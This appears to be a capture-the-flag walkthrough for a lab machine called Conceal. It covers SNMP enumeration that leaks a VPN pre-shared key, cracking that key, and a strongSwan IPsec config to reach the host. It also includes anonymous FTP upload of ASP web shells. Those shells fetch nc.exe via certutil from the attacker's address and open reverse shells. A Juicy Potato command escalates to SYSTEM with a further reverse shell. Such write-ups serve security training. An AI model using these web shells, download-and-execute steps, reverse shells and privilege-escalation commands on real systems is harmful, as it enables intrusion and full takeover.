PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open          snmp         SNMPv1 server (public)
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds 
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
Service Info: Host: Conceal


```
snmpwalk -c public -v1 10.10.10.116
```
Important info
```STRING: "IKE VPN password PSK - 9C8B1A372B1878851BE2C097031B6E43"```

Hash cracked - ```Dudecake1!```


Detected it is ike version 1 coz --ikev2 doesnot work at all. and by default packet is in --ikev1 format

VPN client StrongSwan- ike vpn client

Links for help for config:
```
https://www.howtoforge.com/tutorial/strongswan-based-ipsec-vpn-using-certificates-and-pre-shared-key-on-ubuntu-16-04/ 

https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection

https://blog.ruanbekker.com/blog/2018/02/11/setup-a-site-to-site-ipsec-vpn-with-strongswan-and-preshared-key-authentication/
```
Final working config files

/etc/ipsec.conf
```
config setup
        charondebug="all"
        uniqueids=yes
        strictcrlpolicy=no
 
# connection to amsterdam datacenter
conn conceal
  authby=secret
  auto=start
  keyexchange=ikev1
  ike=3des-sha1-modp1024!
  esp=3des-sha1!
  left=10.10.14.21
  right=10.10.10.116
  rightsubnet=10.10.10.116[tcp]
  type=transport

```
/etc/ipsec.secret
```
10.14.21 10.10.10.116 : PSK "Dudecake1!"
```
**Type=Transport is working, also need rightsubnet and with the protocol mentioned else it doesnot work**
**decrease mtu size to 1100 to avoid packet loss coz of dual VPNs**

NMAP -sT will work nothing else

anonymous login at ftp.
/upload/ directory found
put the si.asp via ftp anon login and go to /upload/ to execute file

.asp, .aspx not getting to work, use simple asp scripts to work

1.
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>

2.
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c certutil -urlcache -split -f http://10.10.14.21/nc.exe C:\\windows\temp\\nc.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>

3.
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\\windows\temp\\nc.exe -e cmd.exe 10.10.14.21 443")
o = cmd.StdOut.Readall()
Response.write(o)
%>

Juicy Potato- Privesc
error 10038 if wrong clsid. 

https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_10_Enterprise

Pick from the ones NT Authority/System ones

```cmd
jp.exe -l 1337 -p C:\Windows\system32\cmd.exe -a "/c %TEMP%\nc1.exe -e cmd.exe 10.10.14.21 444" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```